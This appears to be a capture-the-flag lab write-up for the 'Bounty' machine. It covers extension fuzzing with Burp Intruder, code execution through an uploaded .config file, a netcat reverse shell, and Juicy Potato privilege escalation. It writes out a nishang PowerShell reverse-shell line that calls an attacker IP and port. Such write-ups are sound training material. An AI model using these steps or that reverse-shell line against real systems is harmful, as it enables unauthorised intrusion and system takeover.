# Bounty

### Machine Info
![](screenshots/bounty.png)

#### Nmap
![](screenshots/nmap.png)


##### HTTP (Port 80)

Index Page:
![](screenshots/index.png)

###### Gobuster
![](screenshots/gobuster.png)

From the page `/transfer.aspx`, it seems like we can upload and I tried to upload file with extension `aspx,asp,php` but failed. Let's just check file extension by using `burpsuite`.

###### BurpSuite

First just create file extension list:
![](screenshots/file_extension.png)

Run `Burp` and send request to `intruder` and set payload:

![](screenshots/intruder.png)

Clear all markers and only add for extension.
![](screenshots/payload1.png)

![](screenshots/payload2.png)

Result:
![](screenshots/burp_result.png)

As we can see from the result, only `jpeg` and `config` files have different length because it gets message `File uploaded successfully` while others get `Invalid File. Please try again`.


I searched PoC about remote code execution with `.config` extension and found good one: []()https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c

I uploaded `nc.exe` to the `C:\Windows\Temp\` directory and just executed `nc.exe` to get reverse shell:

![](screenshots/upload_success.png)

![](screenshots/upload_exec.png)

`nc` listener:
![](screenshots/user_shell.png)



#### Privilege Escalation
![](screenshots/whoami_priv.png)

The `SeImpersonatePrivilge` is enabled which means we can use `juicy potato`:
[]()https://github.com/ohpe/juicy-potato
```
Juicy Potato is a weaponised version of RottenPotatoNG. If user have SeImpersonate or SeAssignPrimaryToken privilege (most services account have), this can be abused and user can impersonate token and will have system privilege.
```


`nishang`s powershell reverse shell:
```
# Add this line at the end of the script
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 5555
```
Create and upload bat file which will be executed by Juicy Potato:
![](screenshots/psbat.png)

Upload and Execute Juicy Potato:
![](screenshots/juicypotato.png)

`nc` listener on attacking side:
![](screenshots/root_shell.png)

And you can get `root.txt` :)
